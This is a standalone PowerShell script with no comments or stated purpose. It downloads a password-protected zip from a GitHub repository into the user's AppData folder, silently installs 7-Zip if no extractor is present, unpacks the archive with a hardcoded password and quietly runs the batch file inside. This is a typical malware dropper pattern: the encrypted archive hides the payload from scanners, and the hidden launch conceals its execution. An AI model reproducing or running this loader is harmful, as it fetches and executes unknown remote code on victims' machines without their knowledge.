$packagesPath = "$env:APPDATA\packages"
$winrarPath = "C:\Program Files\WinRAR\WinRAR.exe"
$sevenZipPath = "C:\Program Files\7-Zip\7z.exe"
$ConfirmPreference = 'None'
$archivePath = "$packagesPath\small.zip"
$extractPath = "$packagesPath"
$password = "lVEiffNqkE12"

if (-not (Test-Path $packagesPath)) {
    New-Item -ItemType Directory -Path $packagesPath -Force
}
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/lorenzoricci978-stack/testos/8a460770c7c1bac1abdb15e463640a8dc8e98956/small.zip" -OutFile "$packagesPath\small.zip"
if (Test-Path $winrarPath) {
    & $winrarPath x $archivePath $extractPath "-p$password"
}
elseif (Test-Path $sevenZipPath) {
    & "$sevenZipPath" x "$archivePath" -o"$extractPath" "-p$password"
} else {
    $installerPath = "$packagesPath\7z-installer.exe"
    
    Invoke-WebRequest -Uri "https://www.7-zip.org/a/7z2407-x64.exe" -OutFile $installerPath
    & "$installerPath" /S /D="C:\Program Files\7-Zip"
    
    Start-Sleep -Seconds 3

    if (Test-Path $sevenZipPath) {
        & "$sevenZipPath" x "$archivePath" -o"$extractPath" "-p$password"
    } else {
        Write-Host "7-Zip installation failed"
    }
}
Start-Sleep -Seconds 3
Set-Location "$packagesPath"
Start-Process "$packagesPath\small.bat" -NoNewWindow